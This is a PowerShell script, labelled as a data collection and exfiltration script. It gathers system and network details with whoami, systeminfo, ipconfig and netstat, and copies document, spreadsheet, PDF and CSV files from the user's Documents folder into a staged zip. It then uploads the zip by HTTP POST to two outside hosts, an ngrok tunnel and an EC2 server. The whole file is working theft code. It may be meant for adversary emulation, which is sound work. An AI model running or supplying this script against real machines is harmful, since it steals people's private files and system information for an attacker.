# Data collection and exfiltration script

#
# 1 - Gather system information
#
$system_drive = (Get-WmiObject Win32_OperatingSystem).SystemDrive
$exfil_folder = "$system_drive\temp\data"

# Create stage folder
if (-Not (Test-Path -Path $exfil_folder))
{
    New-Item -ItemType Directory -Path $exfil_folder
}

# Collect and copy system information
# cmd /c whoami.exe | Out-File "sysinfo.txt" -Force
# cmd /c systeminfo.exe | Out-File "sysinfo.txt" -Append -Force
# cmd /c ipconfig.exe | Out-File "sysinfo.txt" -Append -Force
cmd /c 'whoami.exe && systeminfo.exe && ipconfig.exe && netstat.exe' | Out-File "sysinfo.txt" -Force

Copy-Item "sysinfo.txt" "C:\temp\data" -Force

#
# 2 - Staging data
#
$archive = "$system_drive\temp\staged.zip"

# Collect documents and stage it in a folder
$files = Get-ChildItem "$env:USERPROFILE\Documents" -Include ('*.txt', '*.xlsx', '*.docx', '*.doc', '*.xls', '*.pdf', '*.pptx', '*.csv') -Recurse
foreach ($file in $files) {
    Copy-Item $file.FullName $exfil_folder -Force -ErrorAction SilentlyContinue
}

# Compress data
Compress-Archive -Path $exfil_folder -DestinationPath $archive -Force

#
# 3- Exfiltation part
#
$hostname = $env:COMPUTERNAME
$date = Get-Date -UFormat %Y-%m-%d_%H-%M
$FilePath = 'C:\temp\staged.zip';

$fileBytes = [System.IO.File]::ReadAllBytes($FilePath);
$fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes);
$boundary = [System.Guid]::NewGuid().ToString(); 
$LF = "`r`n";

$bodyLines = ( 
    "--$boundary",
    "Content-Disposition: form-data; name=`"targetfile`"; filename=`"$date-$hostname-staged.zip`"",
    "Content-Type: application/octet-stream$LF",
    $fileEnc,
    "--$boundary--$LF" 
) -join $LF

$URLs = @(
    'http://mafube45655731.ngrok.io/web/upload.php',
    'http://ec2-user@ec2-3-239-215-107.compute-1.amazonaws.com:9001/web/upload.php'
)
foreach ($URL in $URLs) {
    Invoke-RestMethod -Uri $URL -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
}

# Remove folder
# Remove-Item -Path $exfil_folder -Force -Recurse